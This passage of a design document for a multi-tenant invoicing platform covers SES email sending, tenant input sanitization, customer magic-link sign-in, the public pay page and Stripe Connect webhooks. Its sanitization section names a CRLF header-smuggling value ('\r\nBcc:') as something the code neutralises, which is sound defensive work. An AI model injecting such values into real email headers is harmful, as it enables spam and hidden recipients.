  components/
    TenantEmailLayout.tsx    ← shared shell: logo header, footer, color-scheme meta
    Button.tsx               ← primary CTA; tenant primaryColor with computed foreground
    Divider.tsx
  templates/
    InvoiceSent.tsx          ← "Pay Invoice" CTA → /pay/{payToken}
    QuoteSent.tsx            ← "View Quote" → portal
    RecurringInvoiceSent.tsx
    StaffInvite.tsx
                             ← not built yet: PaymentReceipt.tsx, MagicLinkSignIn.tsx
  send.ts                    ← SES transport: sendEmail, sendInvitationEmail, pickReplyTo, formatFromHeader
  sanitize.ts                ← sanitizeEmailField / sanitizeHeaderValue (R4)
  format.ts                  ← formatCurrency
  paymentIncident.ts         ← owner alert copy (platform-branded)
  sesEvents.ts               ← sesEventsWebhook: SNS → lastEmailStatus
```

**`send.ts` contract:**

- **From** `"{Tenant name}" <EMAIL_FROM_ADDRESS>` (default `notifications@techflowsolutions.ca`). Sending from the verified platform identity keeps SPF/DKIM/DMARC aligned. Printable-ASCII names are quoted; others use RFC 2047 encoding. Owner incident alerts send as `"TechFlow"`.
- **Reply-To** `pickReplyTo(meta.contactEmail, meta.etransferEmail)` — customer replies reach the contractor, not TechFlow. Non-negotiable for the bundled-website offering.
- **Tags** `category` (`invoice` | `quote` | `recurring-invoice` | `staff-invite` | `payment-incident`), `tenantId`, `documentId` — SES events use them to find the document.
- **Configuration set** `SES_CONFIGURATION_SET` (required for bounce/complaint events). **SES tenants**: `SES_TENANTS_ENABLED=true` passes `TenantName = tenantId` once tenants are provisioned in SES — each TechFlow tenant then gets isolated reputation metrics and automatic pausing.
- **Idempotency** — an `idempotencyKey` claims `emailSends/{sha256(key)}` in a transaction before sending (`sending` → `sent`, released on failure, stale claims taken over after 10 minutes, 30-day TTL). Automated senders use it: recurring invoices per generated invoice, invitations per invite, incident alerts per incident and owner. Manual "Send" clicks don't — resending an invoice is a legitimate action.
- Recipient addresses are never logged; category, tenant, document id, and SES message id are.
- Every function that sends declares `secrets: EMAIL_SECRETS` (`AWS_SES_ACCESS_KEY_ID`, `AWS_SES_SECRET_ACCESS_KEY`).

**Delivery feedback (closes P10):** SES configuration set → SNS topic → `sesEventsWebhook`. The webhook verifies each SNS message signature against the AWS signing certificate (https, `sns.<region>.amazonaws.com`), requires `TopicArn == SES_EVENTS_TOPIC_ARN`, confirms subscriptions only for AWS URLs, and writes `lastEmailStatus` (`delivered` | `bounced` | `complained` | `delayed` | `rejected`), a detail string, the message id, and a timestamp on the tagged invoice or quote. The dashboard can show "bounced" instead of letting the contractor assume "sent" reached the customer.

**Payment incident alerts:** the Stripe Connect webhook writes `paymentIncidents/{kind}_{stripeObjectId}` (`auto-refund-version-mismatch`, `dispute-created`, `dispute-lost`, `tenant-mismatch`). The `onPaymentIncidentCreated` trigger emails every active owner when the document is created; `tenant-mismatch` is logged, not emailed. Deterministic ids mean a webhook redelivery updates the doc rather than re-triggering.

**`<TenantEmailLayout>` contract:** props `tenant` (name, address, logoUrl, emailFooter, primaryColor), `preview`, `children`. The header shows the logo (max 200×60px) or the tenant name; the footer shows name, address, `emailFooter`, and "Questions? Reply to this email." `color-scheme: light` meta tags prevent Apple Mail and Outlook dark-mode inversion. Logos are currently passed as base64 data URLs, which Gmail and Outlook block (A-06).

**Email design principles (enforced by convention and code review):**

1. Single-column layout, 600px max width.
2. One primary CTA button; secondary actions are small text links.
3. Logo max 200×60px.
4. System fonts only (Arial/Helvetica) — independent of the tenant's web/PDF `fontFamily`.
5. Tenant `primaryColor` on the CTA button only; body text stays dark on white.
6. Contrast guard — CTA foreground from `computeForeground(primaryColor)`.
7. HTML and plain-text bodies are always sent (React Email `plainText` render) — spam filters penalise HTML-only mail.
8. From the platform identity, Reply-To the tenant (above).
9. No unsubscribe link on transactional email; CAN-SPAM and CASL exempt it, and adding one signals marketing.

**`previewText` convention (mandatory per template):** each template exports a `build…PreviewText(props)` returning 80–110 characters, passed as `<TenantEmailLayout preview>`. Examples: InvoiceSent `Invoice #INV-0042 from Acme Plumbing — $524.30 due Apr 27`; StaffInvite `Jane Owner invited you to join Acme Plumbing on TechFlow`.

**InvoiceSent content:** tenant logo; "Hi {firstName}"; "{tenant} has sent you an invoice for {total}"; large **Pay Invoice** CTA → `/pay/{payToken}`; small "view in your customer portal" link; collapsed summary (invoice number, due date, total); footer. No line-item table — the PDF and the pay page carry the detail. The email is the envelope, not the document.

**R4 — tenant input sanitization (mandatory).** Tenant-controlled strings reach headers (From display name, Reply-To, Subject) and template text. `sanitizeEmailField(value, maxLen)` drops NUL, C0 controls, and DEL; folds CR/LF/tab runs into single spaces (defusing header smuggling like `\r\nBcc:`); trims; and caps length (name 100, address 300, footer 500, header values 200). `sanitizeHeaderValue` returns `null` when nothing remains, and `pickReplyTo` additionally requires a valid address. `send.ts` sanitizes every header it builds, and `TenantEmailLayout` re-sanitizes defensively. **No `dangerouslySetInnerHTML` anywhere under `functions/src/emails/`** — if a template ever needs rich text, revisit with a dedicated sanitizer.

### `convertQuoteToInvoice` — detail

Reads a quote document, creates a new invoice document in the same tenant with:
- Same customer
- Same line items (hourly services + line items)
- Same totals and tax settings
- New invoice number from `tenants/{tenantId}/counters/invoice`
- Fresh `tenantSnapshot` (in case branding changed since quote was created)
- Link back to the source quote: `sourceQuoteId: quoteId`
- Marks the source quote as `status: 'converted'` and stores `convertedToInvoiceId`

Feature gate: must have BOTH `quotes` AND `invoices` enabled. If a tenant's `invoices` flag were ever false, they couldn't convert (shouldn't happen since `invoices` is a core feature, but the check is defensive).

Transactional: the quote status update and the invoice creation happen in a single Firestore transaction so a partial failure can't leave an orphan or a double-conversion.

### Customer function auth pattern

Customer-facing callables use this shape (no `tenantId` in the token):

```typescript
export const getCustomerInvoices = onCall(async (request) => {
  const rawEmail = request.auth?.token.email;
  const emailVerified = request.auth?.token.email_verified;
  if (!rawEmail || !emailVerified) {
    throw new HttpsError('unauthenticated', 'Customer email not verified');
  }
  // C2 fix — lowercase BEFORE querying. Invoices are stored with
  // lowercased customer.email, so the comparison must match.
  const email = String(rawEmail).toLowerCase();

  // collectionGroup query using admin SDK (bypasses rules, safe because we
  // enforce the email match here in code)
  const snap = await db.collectionGroup('invoices')
    .where('customer.email', '==', email)
    .orderBy('createdAt', 'desc')
    .limit(100)
    .get();

  return snap.docs.map(d => ({ id: d.id, path: d.ref.path, ...d.data() }));
});
```

Customer-facing payment creation is NOT a separate callable. The portal's "Pay Now" button resolves the invoice's current `payToken` (via `getCustomerInvoiceDetail`) and redirects the customer to `/pay/{payToken}`, which is the same public pay route reached from the email. The token-authenticated `createPayTokenCheckoutSession` callable handles Stripe session creation from there — one codepath, one set of guards.

### Invoice numbering
There is no separate `consumeNumber()` helper: `createInvoice`, `convertQuoteToInvoice`, and the recurring processor increment `tenants/{tenantId}/counters/invoice.value` (quotes: `counters/quote`) inside the same transaction that creates the document — race-safe and path-scoped.

### Stripe webhook
- Webhook receives events with `account` field (Connect)
- Use `event.account` to read `stripeAccounts/{event.account}` → `{ tenantId }` (single doc read, no index, no `collectionGroup` scan). **Do NOT use `db.collectionGroup('meta').where('stripeAccountId', '==', event.account)`** — that path would require a composite collection-group index AND be slower and more fragile than the reverse lookup.
- Route payment updates to `tenants/{tenantId}/invoices/{invoiceId}`
- Include `tenantId` and `invoiceId` in Stripe checkout session metadata at creation time as a double-check

### Recurring invoice processor
- Scheduled function iterates `collectionGroup('recurringInvoices')`
- Extract `tenantId` from each doc's parent path
- Check tenant's `entitlements.features.recurringInvoices` — skip if disabled
- Generate new invoice under the correct tenant's path

### Customer magic link flow (end-to-end specification)

**Trigger:** The contractor sends an invoice via `sendInvoiceEmail`. The email body contains a "View & Pay Invoice" button with a URL like:
```
https://invoices.smithplumbing.ca/portal/invoices/{id}?tenantId={tenantId}
```
(Or `portal.techflowsolutions.ca/portal/invoices/{id}?tenantId={tenantId}` for tenants without a custom domain.)

**Route mapping:** `/portal/invoices/[id]` is the canonical single-invoice route in the repo structure (Phase 3). Earlier drafts of this document referenced `/portal/invoices/[id]?invoiceId=...` as shorthand — that's **not a separate route**, it's the same page. The email link uses the canonical App Router path directly. `tenantId` is passed as a query param so the middleware/page can resolve branding before the invoice doc is read (the invoice is under `tenants/{tenantId}/invoices/{id}` and the ID alone isn't enough to locate it).

**Flow:**
1. Customer clicks the link in their email.
2. The `/portal/invoices/[id]` page checks if the user is already authenticated with a verified email matching the invoice's `customer.email`. If yes, show the invoice immediately.
3. If not authenticated, the page shows a branded login screen (tenant branding resolved from the domain or `tenantId` param) with one option: "Sign in with email." Customer enters their email.
4. **⚠️ BEFORE calling sendSignInLinkToEmail:** store the customer's email in `localStorage` (e.g. `localStorage.setItem('emailForSignIn', email)`). This is **mandatory** — Firebase's `signInWithEmailLink()` requires the email as a parameter on return, and if the customer opens the magic link on a different browser/device or their tab state is lost, the email won't be available from memory. Without this step, the first login attempt fails silently.
5. App calls `sendSignInLinkToEmail(email, { url: <the original /portal/invoices/[id] URL>, handleCodeInApp: true })`. Firebase sends a magic link to the customer's inbox.
6. Customer clicks the magic link in the second email. The return page detects it's a sign-in link via `isSignInWithEmailLink(auth, window.location.href)`, retrieves the email from `localStorage.getItem('emailForSignIn')`, and calls `signInWithEmailLink(auth, email, window.location.href)`. If `localStorage` is empty (different device/browser), prompt the customer to re-enter their email before completing sign-in. On success, clear the stored email from `localStorage`.
7. Firebase Auth completes sign-in, sets `email_verified: true`. The page redirects to the original `/portal/invoices/[id]?invoiceId=...` URL (carried in the `actionCodeSettings.url`).
8. The page now has an authenticated user with a verified email. It calls `getCustomerInvoiceDetail` (or reads Firestore directly if rules permit) and renders the invoice with the embedded `tenantSnapshot` branding.
9. Customer can pay (redirect to `/pay/{payToken}` → `createPayTokenCheckoutSession` → Stripe Checkout on the tenant's account) or download the PDF.

**Key implementation details:**
- `sendInvoiceEmail` Cloud Function must construct the portal URL with the correct domain (custom if set, generic if not) and include `tenantId` + `invoiceId` as query params.
- The `actionCodeSettings.url` passed to `sendSignInLinkToEmail` must point back to the exact invoice view URL so the customer lands on the right page after auth.
- Firebase Auth authorized domains must include the tenant's custom domain (if any) for the magic link redirect to work. See Phase 5 custom domain automation.
- First-time customers are auto-created in Firebase Auth by the magic link flow — no pre-registration needed.
- Returning customers who are already signed in skip steps 3–5 entirely.

### Bundle 3 carry-over
All the Cloud Functions auth-check security fixes from the original Phase 3 Bundle 2 audit (missing `request.auth` checks on `previewInvoicePDF`, `previewQuotePDF`, `sendQuoteEmail`, `sendInvoiceEmail`, `createCheckoutSession`) are subsumed into this rewrite. Every function in the new codebase will enforce auth + tenantId + feature gates from the first commit.

**Estimated effort:** 4–6 days

---

## Phase 3 — Frontend Architecture (Next.js + Tailwind)

### Repo structure

```
src/
  app/
    (auth)/
      login/page.tsx           ← tenant user login (email + password)
      signup/page.tsx          ← tenant user signup (new tenant + owner)
      forgot-password/page.tsx ← calls sendPasswordResetEmail(); confirmation screen
      auth/action/page.tsx     ← Firebase action-code handler (?mode=resetPassword |
                                  verifyEmail | recoverEmail); dispatches by mode,
                                  renders branded reset/verify UI so links don't send
                                  users to the default Firebase-hosted page
    (dashboard)/               ← tenant admin area, requires tenantId claim
      layout.tsx               ← wraps with TenantProvider
      dashboard/page.tsx
      invoices/
        page.tsx
        new/page.tsx
        [id]/page.tsx
      quotes/                  ← gated by 'quotes' feature
        [id]/page.tsx          ← has "Convert to Invoice" action
      customers/page.tsx
      settings/
        page.tsx               ← business info + branding
        team/page.tsx          ← staff invitations (list + invite form + revoke)
      billing/page.tsx         ← Stripe Connect onboarding
      accept-invite/page.tsx   ← staff invite acceptance landing (verifies token, sets claims);
                                  as built at src/app/accept-invite/, outside the dashboard group
    (portal)/                  ← customer portal, requires email_verified, NO tenantId
      layout.tsx               ← wraps with CustomerPortalProvider + generateMetadata(tenant)
      portal/
        login/page.tsx         ← magic link sign-in (branded, SSR tenant fetch)
        page.tsx               ← list of customer's invoices across all tenants
        invoices/[id]/page.tsx ← single invoice view + pay button + PDF download
        quotes/[id]/page.tsx   ← single quote view + PDF download
    (pay)/                     ← public no-auth pay pages, resolved by JWT pay token
      pay/
        [token]/page.tsx       ← public hosted pay page — SSR verifies token, shows branded
                                 invoice summary + payment method list (e-transfer first,
                                 then credit card with optional surcharge disclosure).
                                 No Firebase auth — the signed JWT is the auth.
        [token]/success/page.tsx ← Stripe redirect target after successful checkout
        [token]/cancelled/page.tsx ← Stripe redirect target if customer cancels
    api/
      pdf/
        invoice/route.ts       ← Next.js proxy → Cloud Run pdf-service (auth: tenant OR customer)
        quote/route.ts
      webhooks/
        stripe/platform/route.ts  ← platform-scope events (R5)
        stripe/connect/route.ts   ← connected-account events (D1)
  lib/
    firebase/
      client.ts                ← client SDK init
      admin.ts                 ← admin SDK (server only)
    tenant/
      TenantContext.tsx        ← for tenant admin area
      useTenant.ts
      FeatureGate.tsx
    portal/
      CustomerPortalContext.tsx  ← for customer portal area
      useCustomerPortal.ts
    features.ts                ← canonical feature constant
    auth/
      useAuth.ts               ← unified auth hook; routes based on claims after login
  components/
    ui/                        ← shared primitives (button, input, card)
    invoices/                  ← shared between dashboard and portal
    customers/                 ← dashboard only
    quotes/                    ← shared between dashboard and portal
    portal/                    ← portal-specific (InvoicePayButton, PortalHeader, etc.)
```

### Auth recovery flow (password reset + email verification)

Tenant users need a path back in when they forget their password, and owners creating Connect accounts should have verified emails. Both run on the same Firebase action-code infrastructure:

- **`/forgot-password`** — single input + "send reset link" button. Calls `sendPasswordResetEmail(auth, email, { url })` where `url` is the `/auth/action` page on our own domain. Always shows a generic success message (don't leak whether the email is registered — standard anti-enumeration).
- **`/auth/action`** — one page, dispatches by `?mode=` query param: `resetPassword` (renders "new password" form + calls `confirmPasswordReset`), `verifyEmail` (calls `applyActionCode`, then redirects to `/dashboard`), `recoverEmail` (rare, handled defensively). Must `checkActionCode` before rendering — expired/used codes get a clear error instead of a mysterious failure.
- **Email verification gate** — add `if (!user.emailVerified) redirect('/verify-email')` to the `(dashboard)` layout. `/verify-email` shows a "resend verification email" button and a "check your inbox" message. Block invoice creation until verified to satisfy Stripe Connect's business-contact-email expectations.
- **Firebase project configuration** (one-time per project — dev, staging, prod):
  - Email templates: set the **"Password reset"** and **"Email verification"** action URLs to `https://<portal-domain>/auth/action` (not the default Firebase-hosted URL). Custom templates branded with the TechFlow name.
  - Authorized domains: include `<portal-domain>` and every tenant custom domain so the action links redirect correctly. Custom domains are added automatically by the `setupCustomDomain` Cloud Function (Phase 5).
- **2FA deferred to post-launch.** Noted as a gap — owner accounts with Stripe Connect access arguably warrant it. Acceptable for MVP; flag in /settings/security as "coming soon" so it's visible.

### Post-login routing

The login flow checks the user's token claims and routes accordingly:

```typescript
// after successful sign-in
const claims = (await user.getIdTokenResult()).claims;
if (claims.tenantId) {
  router.push('/dashboard');       // tenant user
} else if (claims.email_verified) {
  router.push('/portal');          // customer
} else {
  router.push('/verify-email');    // shouldn't happen with magic link, defensive
}
```

### ⚠️ Firebase Auth custom claims propagation delay

**This is a known Firebase gotcha that will break the signup flow if not handled.**

When `onSignup` fires and calls `setCustomUserClaims(uid, { tenantId, role })`, the user's **current ID token in the browser still has NO `tenantId` claim.** Firebase custom claims only propagate to the client on the next token refresh, which normally happens every ~60 minutes. If the signup page redirects to `/dashboard` immediately, `TenantProvider` reads the token, finds no `tenantId`, and the user gets bounced to login or sees an error.

**Required fix — force token refresh after signup:**
```typescript
// In the signup page, AFTER calling the onSignup Cloud Function:
await user.getIdToken(true);  // force refresh — pulls fresh claims from server
const claims = (await user.getIdTokenResult()).claims;
// NOW claims.tenantId is present — safe to redirect
router.push('/dashboard');
```

This applies to:
- **Signup flow** (Phase 5): user signs up → `onSignup` sets claims → must force refresh before redirect.
- **Role changes** (Phase 5): owner changes another user's role via `setUserRole` → that user's token is stale until they refresh. Consider showing a "your permissions were updated, please refresh" toast, or triggering a refresh via a Firestore listener on the user's doc.
- **NOT customer magic link flow**: customers have no custom claims (no `tenantId`). Their auth relies on `email_verified` which is set natively by Firebase Auth during magic link sign-in, not via custom claims.

### `CustomerPortalContext` — the customer-side provider

Mirrors `TenantContext` but scoped to what a customer can see. Loads `getCustomerInvoices()` result once, exposes:
- `customerEmail` (from auth token)
- `invoices` (array, deduplicated across tenants)
- `quotes` (array)
- `getInvoice(id)` / `getQuote(id)` accessors
- `getTenantSnapshot(invoiceOrQuote)` helper — reads the embedded `tenantSnapshot` so the portal UI can render the right logo/colors for each document

**Critical:** the portal UI renders branding PER DOCUMENT from the `tenantSnapshot`, not from a global context. A customer with invoices from three different contractors sees three different logos in their list. Each invoice's detail page takes on the branding of the contractor who sent it.

### `lib/features.ts` — canonical feature list

Two identical copies must stay in sync: `src/lib/features.ts` (UI gating) and `functions/src/shared/features.ts` (enforcement) — the functions package compiles separately.

```typescript
export const FEATURE_DEFAULTS = {
  invoices: true,
  recurringInvoices: false,
  quotes: true,
  customDomain: false,
  stripeConnect: false,
  stripePayments: false,
  etransfer: true,
  multiCurrency: false,
  cardSurcharge: false,   // D3 — card surcharging ships disabled
} as const;

export type FeatureKey = keyof typeof FEATURE_DEFAULTS;

// An explicit boolean override in entitlements/current.features wins;
// otherwise the code default applies.
export function resolveFeature(
  key: FeatureKey,
  tenantOverrides: Partial<Record<FeatureKey, boolean>> | null | undefined,
): boolean;
```

**Critical property:** when a new key is added, every existing tenant gets its default at read time — no Firestore backfill. Server side, `requireFeature(tenantId, key)` throws `permission-denied` and returns the resolved map; `loadFeatures(tenantId)` resolves every key without throwing.

### `lib/tenant/TenantContext.tsx`

```typescript
interface TenantContextValue {
  tenantId: string;
  meta: TenantMeta;
  plan: 'free' | 'starter' | 'pro';
  features: typeof DEFAULT_FEATURES;
  hasFeature: (key: FeatureKey) => boolean;
}

export function TenantProvider({ children }) {
  const { user } = useAuth();
  const tenantId = user?.claims.tenantId;

  const meta = useFirestoreDoc(`tenants/${tenantId}/meta/settings`);
  const entitlements = useFirestoreDoc(`tenants/${tenantId}/entitlements/current`);
  const features = useMemo(() => resolveFeatures(entitlements), [entitlements]);

  return (
    <TenantContext.Provider value={{
      tenantId,
      meta,
      plan: entitlements?.plan ?? 'free',
      features,
      hasFeature: (key) => features[key] === true,
    }}>
      {children}
    </TenantContext.Provider>
  );
}
```

### Three feature-gating primitives

**1. Hook — for conditional logic inside a component:**
```tsx
const { hasFeature } = useTenant();
if (hasFeature('quotes')) { /* show quote actions */ }
```

**2. `<FeatureGate>` component — for JSX blocks:**
```tsx
<FeatureGate feature="recurringInvoices">
  <RecurringToggle />
</FeatureGate>

<FeatureGate feature="quotes" fallback={<UpgradePrompt feature="quotes" />}>
  <QuotesPage />
</FeatureGate>
```

**3. Route guard — for whole pages:**
```tsx
// app/quotes/page.tsx
export default function QuotesPage() {
  const { hasFeature } = useTenant();
  if (!hasFeature('quotes')) redirect('/dashboard');
  return <QuotesList />;
}
```

### Navigation gating

Sidebar iterates a nav config and filters by `hasFeature()`:
```tsx
const NAV = [
  { href: '/dashboard', label: 'Dashboard' },
  { href: '/invoices', label: 'Invoices', feature: 'invoices' },
  { href: '/quotes', label: 'Quotes', feature: 'quotes' },
  { href: '/customers', label: 'Customers', feature: 'customers' },
];

{NAV.filter(item => !item.feature || hasFeature(item.feature))
    .map(item => <NavLink key={item.href} {...item} />)}
```

### Tenant-scoped query wrapper
Every Firestore read goes through a helper that injects the tenant path. Because it calls `useTenant()` internally, it IS a React hook and MUST be named with the `use` prefix to satisfy the `react-hooks/rules-of-hooks` ESLint rule:
```typescript
function useTenantCollection<T>(collectionName: string) {
  const { tenantId } = useTenant();
  return collection(db, 'tenants', tenantId, collectionName) as CollectionReference<T>;
}
```

### Observability — Sentry (set up at scaffolding time, not "later")

When 50 tenants run on the same codebase, "the PDF is broken" from one tenant with zero repro steps is a nightmare to debug without error tracking. Sentry solves this cheaply.

**What to capture:**
- All uncaught exceptions in Next.js client + server + API routes
- All uncaught exceptions in Cloud Functions (separate Sentry config for the functions package)
- Every exception tagged with `tenantId` (from auth token or request context) and `uid`. Without this tag, errors are useless noise at 50-tenant scale.

**Setup (~30 min):**
1. `npm install @sentry/nextjs` in the Next.js app
2. Run `npx @sentry/wizard@latest -i nextjs` — generates `sentry.client.config.ts`, `sentry.server.config.ts`, `sentry.edge.config.ts`
3. In a root layout or middleware, set the scope tag from the auth token:
   ```typescript
   Sentry.setUser({ id: uid });
   Sentry.setTag('tenantId', claims.tenantId ?? 'none');
   ```
4. For Cloud Functions: `npm install @sentry/node` in `functions/`, init in the function entry point, wrap handlers with `Sentry.withScope` to tag tenantId per request.
5. Separate Sentry projects per environment (`techflow-saas-dev`, `techflow-saas-staging`, `techflow-saas-prod`) so dev noise doesn't pollute prod alerts.

**As built:** the Next.js side uses `src/instrumentation.ts` / `src/instrumentation-client.ts` rather than the wizard's `sentry.*.config.ts` (DSNs from `SENTRY_DSN` / `NEXT_PUBLIC_SENTRY_DSN`; no DSN means Sentry no-ops). Cloud Functions Sentry (step 4) is not wired.

**Cost:** Sentry free tier (5k events/month) is enough for MVP. Paid tier ($26/month) when usage outgrows free.

**Estimated effort:** 3–5 days (plus the ongoing cost of writing every feature against this architecture)

### Portal & pay-page metadata injection (favicon + `<title>`)

When a customer lands on `pay.acmeplumbing.com/pay/{token}` or `pay.acmeplumbing.com/portal/invoices/{id}`, the browser tab must show Acme's favicon and "Acme Plumbing" as the title — not "TechFlow." Without this, the bundled-website + portal premium-branded pitch falls apart at the browser-tab level (which is where customers park the tab while they get their credit card).

**Implementation — `(portal)/layout.tsx` and `(pay)/pay/[token]/layout.tsx`:**

```typescript
import type { Metadata } from 'next';
import { adminDb } from '@/lib/firebase/admin';

export async function generateMetadata({ params }): Promise<Metadata> {
  // Portal path: resolve tenantId from middleware-injected header (custom domain
  //   or ?tenantId query param for platform-domain fallback).
  // Pay path: decode JWT (without signature verify — we only need tenantId for
  //   metadata; the verify happens in the page SSR render).
  const tenantId = await resolveTenantIdFromRequest(params);
  if (!tenantId) {
    return { title: 'TechFlow', icons: { icon: '/favicon.ico' } };
  }

  const meta = (await adminDb.doc(`tenants/${tenantId}/meta/settings`).get()).data();
  return {
    title: meta?.name ?? 'Invoice',
    icons: {
      icon: meta?.faviconUrl ?? '/favicon.ico',
    },
    // Open Graph for if the pay link gets shared in SMS / Slack / iMessage
    openGraph: {
      title: `Invoice from ${meta?.name ?? 'TechFlow'}`,
      images: meta?.logoUrl ? [meta.logoUrl] : [],
    },
  };
}
```

Notes:
- **Admin SDK is required** because Firestore rules block unauthenticated reads of `meta`. Same pattern as the branded login page (already documented below).
- **The pay page is Node runtime**, not Edge. Admin SDK requires Node. Explicitly set `export const runtime = 'nodejs';` in the layout to prevent Vercel auto-optimizing it to Edge and breaking.
- **Favicon URL is served from Firebase Storage** via `getDownloadURL()` (the token-bearing public URL, per the logo convention). No Storage rules lookup needed; it's publicly fetchable by the browser on the tab.

### Public pay page (`/pay/[token]`) — content specification

The pay page is a **server component** that calls `verifyInvoicePayToken` (Phase 2 callable) on render, then hydrates the payment method selector on the client. It is the single most important customer-facing surface in the platform.

**C3 — Privacy headers on the pay route (mandatory).** The route segment `app/(pay)/pay/[token]/layout.tsx` must export headers that prevent token leakage and search-engine indexing:

```typescript
// app/(pay)/pay/[token]/layout.tsx
export const runtime = 'nodejs';

export async function generateMetadata(...) { /* ...tenant favicon/title... */ }

// Set response headers for the entire /pay/[token]/** subtree.
// Prevents: (a) Referer leak of the token to external links clicked from the page,
// (b) Google/Bing indexing the page if a customer shares the URL publicly,
// (c) iframe embedding attempting to phish via overlay.
export const headers = {
  'Referrer-Policy': 'no-referrer',
  'X-Robots-Tag': 'noindex, nofollow',
  'X-Frame-Options': 'DENY',
};
```

Rationale: the pay-token is bearer-auth in the URL path. Standard URLs leak via `Referer` headers on outbound links, browser history, email-client link-unfurlers (Outlook Safe Links, Gmail, Slack), and server logs. `no-referrer` plugs the biggest hole (outbound clicks from the page). `noindex` prevents accidental indexing if the token-bearing URL is ever shared in a public channel. `X-Frame-Options: DENY` prevents a phishing site from iframing the real pay page under a fake overlay. Token + `status !== 'paid'` + 60d expiry still provide defense in depth; these headers are the cheap, must-have mitigation.

**Render order (top to bottom):**

1. **Branded header** — tenant logo (from `tenantSnapshot.logo`), tenant name. Background uses `tenantSnapshot.primaryColor` with `computeForeground()` for the text. Height ~80px.

2. **Invoice summary card** — invoice number, issue date, due date, total in large type. Line items collapsed by default with an "Itemized view" toggle that expands the full table. Customer name shown as "Billed to: {name}".

3. **Payment method selector** — **e-Transfer listed first**, then credit card:

   ```
   ┌──────────────────────────────────────────┐
   │  ● Interac e-Transfer       No fees      │  ← selected by default
   │    Send to: invoices@acmeplumbing.com    │
   │    Memo: INV-0042                        │
   │    [Copy details]                        │
   │    ⓘ $3,000 per-transaction limit applies│
   │      at most Canadian banks              │
   └──────────────────────────────────────────┘

   ┌──────────────────────────────────────────┐
   │  ○ Credit Card                           │
   │    Visa, Mastercard, Amex accepted       │
   │    + 2.4% processing fee (if enabled)    │
   │    [Pay with Card →]                     │
   └──────────────────────────────────────────┘
   ```

   - **E-transfer** is instructions only (no Stripe involvement). Shows tenant's `etransferEmail`, the invoice number as suggested memo, and a copy-to-clipboard button. Includes the $3k bank-limit tooltip for customer awareness.
   - **Credit card** CTA calls `createPayTokenCheckoutSession` (Phase 2) which creates a Stripe Checkout session on the tenant's Connect account. If `chargeCustomerCardFees === true`, the surcharge line item is added server-side (Phase 4). The disclosure "+ X% processing fee" is rendered next to the button — required by Visa/Mastercard rules and also just good UX.
   - **If the tenant has no `etransferEmail` configured**, the e-transfer option is hidden and credit card becomes the only option. `createInvoice` surfaces a gentle warning in the dashboard when a tenant sends invoices without e-transfer configured ("Most customers prefer e-Transfer — add your e-Transfer email in Settings to offer it").
   - **If the tenant has no connected Stripe account**, the credit card option is hidden and e-transfer is the only option. `createInvoice` should block send entirely if neither is configured.

4. **Footer** — tenant name, address, `emailFooter` text, "Questions? Reply to the email that brought you here." No platform branding ("powered by TechFlow" etc.) — this is the tenant's surface, not the platform's.

5. **Success / cancel redirect targets:**
   - `/pay/[token]/success` — "Payment received. Thanks!" + link to customer portal to see history. Webhook has already updated the invoice by the time the customer lands here (webhook fires before the redirect completes in most cases, but the page gracefully handles the "not yet paid" flicker by polling `verifyInvoicePayToken` once).
   - `/pay/[token]/cancelled` — "No charge was made. You can try again or use e-Transfer instead." + back button to the pay page.

**Why this design wins:**
- **4 clicks → 1 click.** Customer clicks "Pay Invoice" in email → lands on this page → clicks "Pay with Card" → done. No magic-link round trip.
- **E-transfer first** matches Canadian contractor-customer expectations. The industry default payment method for residential trades is e-Transfer, not card.
- **No platform branding on tenant surfaces.** The portal and pay page look like they belong to the tenant, not TechFlow. That's the premium-bundled-website pitch delivered.

---

## Phase 4 — Stripe Connect (Standard-equivalent accounts, direct charges)

> **D1 (2026-09-13):** connected accounts are created with controller properties equivalent to Standard, not legacy Express, and webhook scopes are corrected to Stripe's actual delivery model.

### Flow

1. **Tenant opens `/billing`** — gated by the `stripePayments` entitlement. "Your plan doesn't include card payments" (entitlement) and "your Stripe account isn't ready" (`stripeStatus`) are separate states.
2. **`startConnectOnboarding`** (callable, owner/admin) creates the account once and reuses it on later attempts; an account deleted in Stripe (`resource_missing`) is recreated:
   ```typescript
   stripe.accounts.create({
     country: currency === "USD" ? "US" : "CA",
     email: ownerEmail,
     controller: {
       losses: { payments: "stripe" },     // Stripe carries negative-balance liability
       fees: { payer: "account" },         // the contractor pays their own Stripe fees
       requirement_collection: "stripe",   // Stripe collects KYC — no business_type or capabilities up front
       stripe_dashboard: { type: "full" }, // refunds and disputes handled in the contractor's Stripe Dashboard
     },
     metadata: { tenantId },
   });
   ```
   `meta.stripeAccountId` **and** the `stripeAccounts/{accountId} → { tenantId }` reverse lookup are written in one batch at creation, so Connect events route even if the tenant never comes back through the return URL. The callable returns an `account_onboarding` AccountLink (`refresh_url` `/billing?stripe=refresh`, `return_url` `/billing/return`).
3. **`/billing/return` → `completeConnectOnboarding`** re-fetches the account and writes `meta.stripeStatus` plus the reverse lookup in one batch.
4. **Checkout** is a direct charge on the tenant's account — `stripe.checkout.sessions.create({...}, { stripeAccount: meta.stripeAccountId })` — see "Token-authenticated checkout" below.
5. **Platform fee:** none. Can be added later with `application_fee_amount`.

**Why Standard-equivalent:** TechFlow earns no platform fee, so it should carry no payment risk. With legacy Express plus direct charges the platform was liable for any contractor's negative balance (refunds, lost chargebacks) and paid per-account Connect fees. `stripe_dashboard.type` is immutable per account — changing it after onboarding means new Stripe accounts for every tenant.

### Two webhook endpoints, two scopes (R5)

Stripe delivers events in two scopes. Each endpoint has its own signing secret and rejects misrouted events with 400 so a misconfigured registration surfaces during setup.

**1. Platform scope — `POST /api/webhooks/stripe/platform`** (`STRIPE_PLATFORM_WEBHOOK_SECRET`). Events about TechFlow's own Stripe account. Nothing needs handling today (no platform billing): the route verifies the signature, rejects events carrying `event.account`, logs, and returns 200.

**2. Connected-accounts scope — `POST /api/webhooks/stripe/connect`** (`STRIPE_CONNECT_WEBHOOK_SECRET`). Every event carries `event.account` and is routed through `stripeAccounts/{event.account}`; unknown accounts get 200 plus an error log. Idempotency uses `stripeEvents/{event.id}` (A-03 open). Register it with "Listen to events on Connected accounts" and these events:

- `checkout.session.completed` — `metadata.tenantId` must match the routed tenant (otherwise a `tenant-mismatch` incident). **C2 guard:** if `metadata.payTokenVersion` differs from the invoice's current version, the tenant regenerated the link mid-checkout — refund on the connected account and write an `auto-refund-version-mismatch` incident instead of marking paid. Otherwise set `status: 'paid'`, `paidAt`, `paymentMethod: 'card'`, `paidAmountCents`, `surchargeAmountCents`, `stripeChargeId` (A-02 open).
- `payment_intent.payment_failed` — log only; the customer can retry.
